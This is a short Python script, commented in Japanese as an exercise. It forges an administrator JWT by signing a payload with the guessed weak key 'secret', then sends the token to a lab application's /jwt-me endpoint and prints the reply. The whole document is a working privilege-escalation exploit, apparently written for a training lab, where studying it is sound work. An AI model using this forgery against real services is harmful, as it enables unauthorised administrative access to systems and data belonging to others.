# 演習用: 弱い鍵で管理者トークンを偽造する
import jwt
import httpx

BASE = "http://app:8000"

# 鍵が "secret" だと分かれば、管理者のトークンを作れる
forged = jwt.encode({"sub": "1", "username": "yamada-taro", "is_admin": 1},
                    "secret", algorithm="HS256")
r = httpx.get(BASE + "/jwt-me", params={"token": forged}, timeout=30)
print("ステータス:", r.status_code)
print(r.json())
